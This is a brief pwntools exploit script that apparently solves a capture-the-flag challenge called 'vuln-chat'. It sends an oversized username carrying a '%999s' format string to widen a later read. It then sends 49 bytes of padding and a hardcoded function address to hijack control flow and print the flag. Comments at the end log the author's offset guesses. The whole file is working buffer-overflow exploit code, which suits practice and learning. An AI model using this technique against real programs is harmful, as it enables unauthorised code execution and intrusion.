from pwn import *
import re
context.terminal = ['tmux','splitw','-h']
p = process("./vuln-chat")
(p.recvuntil("username: "))
#offset =0x1d
offset = 0x14
username = b'e'*offset
username += b'%999s' 

p.sendline(username)
(username)
(p.recvuntil('you?\n'))
flag_fun = 0x0804856b
payload = b'a'*49
payload += p32(flag_fun)
p.sendline(payload)
(p.recvline())
flag = (p.recvline()).decode()
flag = re.findall("flag{.*", flag)[0]
print(flag)
'''
Offset for first one is 20
Offset for seocnd one is 454946 or 455397 
Im a idiot its at 49
'''
